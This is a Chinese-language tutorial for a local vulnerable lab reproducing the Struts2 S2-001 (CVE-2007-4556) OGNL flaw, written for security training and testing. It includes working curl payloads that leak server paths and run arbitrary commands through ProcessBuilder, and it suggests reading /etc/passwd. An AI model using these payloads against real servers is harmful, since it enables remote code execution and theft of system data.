# struts2-s2-001 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-001`
- 端口：`9965`
- 推荐入口：`/login.action`

## 这是什么

Struts2 `S2-001 / CVE-2007-4556` 演示靶场，核心是表单校验失败后对提交值进行回填时的表达式解析问题。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9965` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_001、s2-001、struts2` 过滤到当前项目。
3. 先跑 `struts2_s2_001_attack`，观察校验失败页面里的用户名字段回填结果。
4. 再跑 `struts2_s2_001_normal` 做正常登录对照。

推荐直接使用的首页条目：
- `struts2_s2_001_attack`：POST http://宿主机IP:9965/login.action
- `struts2_s2_001_attack_tomcat_dir`：获取 Tomcat 执行路径
- `struts2_s2_001_attack_web_path`：获取 Web 部署路径
- `struts2_s2_001_attack_exec_pwd`：执行 `pwd`
- `struts2_s2_001_normal`：POST http://宿主机IP:9965/login.action

## 方式二：直接访问接口测试

1. 先访问推荐入口：`http://宿主机IP:9965/login.action`。
2. 提交一个空密码请求，让页面进入校验失败分支：`curl -i -X POST "http://宿主机IP:9965/login.action" -H "Content-Type: application/x-www-form-urlencoded" -d "username=%25%7B7*7%7D&password="`。
3. 观察返回 HTML 中用户名输入框附近的回填结果。
4. 再执行正常登录：`curl -i -X POST "http://宿主机IP:9965/login.action" -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=admin123"`。

## 补充测试 Payload

这些 payload 都是给 `username` 参数使用，`password` 保持为空即可，目的是继续走校验失败回填分支。

1. 获取 Tomcat 执行路径

```text
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```

对应 `curl`：

```bash
curl -i -X POST "http://宿主机IP:9965/login.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'username=%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}' \
  --data-urlencode 'password='
```

2. 获取 Web 路径

```text
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

对应 `curl`：

```bash
curl -i -X POST "http://宿主机IP:9965/login.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'username=%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('\''/'\'')),#response.flush(),#response.close()}' \
  --data-urlencode 'password='
```

3. 执行任意命令

命令本体可以替换 `new java.lang.String[]{"pwd"}`，带参数时改成 `new java.lang.String[]{"cat","/etc/passwd"}`。

```text
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

对应 `curl`：

```bash
curl -i -X POST "http://宿主机IP:9965/login.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'username=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}' \
  --data-urlencode 'password='
```

4. 如果你是通过首页总控台测试，推荐先点现成条目，再用“重放数据包”微调命令参数。

## 测试时重点看什么

1. 校验失败时，页面是否重新渲染登录表单。
2. 用户名字段回填出来的是原始字符串，还是表达式计算后的结果。
3. 对于路径或命令执行型 payload，是否直接把结果写回 HTTP 响应。
4. 正常登录路径是否只进入 success 页面，不出现异常回填。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
